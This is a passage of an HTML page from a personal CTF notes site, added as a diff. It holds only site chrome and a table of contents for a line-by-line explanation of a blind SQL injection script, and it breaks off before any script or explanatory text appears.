@@ -1,0 +1,3279 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Web 安全知识点整理 + 靶场 Writeup">
+      
+      
+        <meta name="author" content="guang">
+      
+      
+        <link rel="canonical" href="https://guang12-c.github.io/ctf-notes/knowledge/sql/blind_sqli_error_%E9%80%90%E8%A1%8C%E8%AE%B2%E8%A7%A3/">
+      
+      
+        <link rel="prev" href="../07-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A2%98/">
+      
+      
+        <link rel="next" href="../../upload/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>逐行讲解(盲注脚本) - guang's CTF Notes</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans+SC:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Noto Sans SC";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/css/bg-video.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#blind_sqli_errorpy" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../../.." title="guang&#39;s CTF Notes" class="md-header__button md-logo" aria-label="guang's CTF Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 9a3 3 0 0 1 3 3 3 3 0 0 1-3 3 3 3 0 0 1-3-3 3 3 0 0 1 3-3m5.86 10.31C16.23 21.22 14.28 22.45 12 23c-2.56-.61-4.7-2.07-6.42-4.37C3.86 16.34 3 13.8 3 11V5l9-4 9 4v6c0 2.39-.64 4.61-1.92 6.67l-2.91-2.91c.52-.79.83-1.76.83-2.76a5 5 0 0 0-5-5 5 5 0 0 0-5 5 5 5 0 0 0 5 5c1 0 1.97-.31 2.76-.83z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            guang's CTF Notes
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              逐行讲解(盲注脚本)
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="切换到深色模式"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="切换到深色模式" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="切换到浅色模式"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="切换到浅色模式" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/guang12-c/ctf-notes" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    guang12-c/ctf-notes
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  首页
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../" class="md-tabs__link">
+          
+  
+  
+    
+  
+  知识点
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../blog/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  WP 博客
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../files/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  工具字典
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="guang&#39;s CTF Notes" class="md-nav__button md-logo" aria-label="guang's CTF Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 9a3 3 0 0 1 3 3 3 3 0 0 1-3 3 3 3 0 0 1-3-3 3 3 0 0 1 3-3m5.86 10.31C16.23 21.22 14.28 22.45 12 23c-2.56-.61-4.7-2.07-6.42-4.37C3.86 16.34 3 13.8 3 11V5l9-4 9 4v6c0 2.39-.64 4.61-1.92 6.67l-2.91-2.91c.52-.79.83-1.76.83-2.76a5 5 0 0 0-5-5 5 5 0 0 0-5 5 5 5 0 0 0 5 5c1 0 1.97-.31 2.76-.83z"/></svg>
+
+    </a>
+    guang's CTF Notes
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/guang12-c/ctf-notes" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    guang12-c/ctf-notes
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    首页
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    知识点
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    知识点
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL 注入
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_2" id="__nav_2_2_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    SQL 注入
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../01-%E5%8E%9F%E7%90%86%E4%B8%8E%E8%AF%86%E5%88%AB/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    原理与识别
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../02-payload%E9%80%9F%E6%9F%A5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    payload 速查
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../03-%E5%8D%A1%E7%82%B9%E5%A4%8D%E7%9B%98/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    卡点复盘
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../04-%E5%9B%9B%E4%B8%AAlab%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    四个 lab 通关记录
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../05-%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    盲注脚本
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../06-OOB%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OOB 带外注入
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../07-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A2%98/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    报错注入专题
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    逐行讲解(盲注脚本)
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    逐行讲解(盲注脚本)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        零、一句话原理
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        一、整体流程
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#127" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        二、第 1–27 行：文件头与导入
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2937" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        三、第 29–37 行：配置区（最常改的地方）
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4046" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        四、第 40–46 行：构造注入语句（脚本的核心）
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="四、第 40–46 行：构造注入语句（脚本的核心）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#44" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        44 行的可替换部件
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#45" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        45 行：不同数据库的「报错装置」
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4953-http" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        五、第 49–53 行：发一个 HTTP 请求
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5669" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        六、第 56–69 行：单次探测（问一个是非题）
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7281" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        七、第 72–81 行：二分查找（核心算法）
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="七、第 72–81 行：二分查找（核心算法）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        为什么 7 次一定能找到
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        改造点
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#84105" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        八、第 84–105 行：通道自检（开机自检）
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#108160" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        九、第 108–160 行：主流程
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="九、第 108–160 行：主流程">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#108119" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        108–119 行：参数检查与横幅
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#121125" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        121–125 行：自检闸门
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#127132" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        127–132 行：准备并行
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#133144" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        133–144 行：收集结果
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#146156" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        146–156 行：输出结果
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#159160" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        159–160 行：入口
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        十、改造速查表
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        十一、常见问题
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="十一、常见问题">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#q1-probe-true" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Q1：为什么 probe 返回 True 表示「字符更大」？
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#q2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Q2：自检过了但爆破结果全错？
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#q3-probe-failed" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Q3：全是 ? / 大量 probe failed？
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
